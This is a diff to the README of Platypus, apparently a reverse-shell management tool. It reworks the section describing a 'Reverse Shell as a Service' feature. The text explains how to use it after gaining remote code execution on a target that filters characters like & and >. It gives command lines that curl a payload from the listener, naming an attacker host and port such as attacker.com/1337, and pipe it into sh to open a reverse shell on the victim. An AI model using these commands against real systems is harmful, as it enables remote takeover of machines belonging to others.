@@ -1,9 +1,11 @@
-#### Reverse shell as a Service
-```bash
-// Platypus is able to multiplexing the reverse shell listening port
-// The port 8080 can receive reverse shell client connection
-// Also these is a Reverse shell as a service running on this port
+## Reverse shell as a Service
+Platypus is able to multiplexing the reverse shell listening port. The port 8080 can receive reverse shell client connection, also these is a Reverse Shell as a Service (RaaS) running on this port.
 
+Assume that you have got an arbitrary rce on the target application, but the target application will strip the non-alph letter like `&`, `>`. then this feature will be useful.
+
+To archive this, all you need is to construct a url which indicate the target 
+
+```bash
 // victim will be redirected to attacker-host attacker-port
 // sh -c "$(curl http://host:port/attacker-host/attacker-port)"
 # curl http://192.168.1.2:8080/attacker.com/1337
@@ -17,7 +19,7 @@ curl http://192.168.1.2:8080/192.168.1.2/8080|sh
 # sh -c "$(curl http://host:port/)"
 ```
 
-#### RESTful API
+## RESTful API
 * `GET /client` List all online clients
 ```
 # curl 'http://127.0.0.1:9090/client'
